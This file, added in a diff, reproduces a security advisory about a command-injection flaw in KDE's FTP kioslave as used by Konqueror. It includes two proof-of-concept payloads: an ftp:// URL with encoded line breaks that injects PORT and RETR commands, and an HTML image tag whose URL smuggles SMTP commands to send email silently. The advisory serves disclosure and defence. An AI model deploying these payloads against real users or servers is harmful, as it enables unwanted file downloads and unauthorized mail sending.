@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/11827/info
+
+KDE FTP kioslave-based applications such as Konqueror are reported prone to an arbitrary FTP server command execution vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied URI input prior to utilizing it to execute FTP commands on remote servers.
+
+This vulnerability allows attackers to embed arbitrary FTP server commands in malicious URIs. Upon following this malicious URI, the victim users Web browser will reportedly connect to the attacker-specified FTP server, and the malicious commands will be sent to the server. This may allow malicious files to be downloaded to the victims computer without their knowledge. Other attacks are also likely possible.
+
+Note: It has been reported that this issue can be leveraged to send email to arbitrary addresses without user interaction.
+
+ftp://ftp.example.com/%0aPORT%20a,b,c,d,e,f%0aRETR%20/file
+
+The 'a,b,c,d,e,f' would represent the IP address and port specifications, as per the FTP RFCs.
+
+This issue has also been reported to allow for the sending of email without user interaction. Embedding the following image into an HTML page reportedly sends an email:
+
+<img src="ftp://foo%0d%0aHELO%20mail%0d%0aMAIL%20FROM%3a&lt;&gt;%0d%0aRCPT%20TO%3a&lt;username%40example.com&gt;%0d%0aDATA%0d%0aSubject%3a%20hacked%0d%0aTo%3a%20username%40example.com%0d%0a%0d%0ahacked%0d%0a.%0d%0a:username@mx.example.net:25/" />
